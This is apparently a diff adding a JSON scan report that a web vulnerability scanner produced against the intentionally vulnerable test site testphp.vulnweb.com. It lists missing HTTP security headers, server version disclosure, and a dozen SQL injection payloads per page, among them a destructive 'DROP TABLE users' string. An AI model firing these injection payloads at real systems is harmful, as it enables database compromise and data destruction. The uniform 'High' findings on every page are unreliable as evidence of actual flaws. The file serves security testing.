+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/cart.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/categories.php"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/categories.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/login.php"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/login.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/artists.php"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/artists.php?test=' OR '1'='1' -- "
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop"
+    },
+    {
+      "error": "Failed to fetch URL: ('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/disclaimer.php?test=' OR 1=1#"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php"
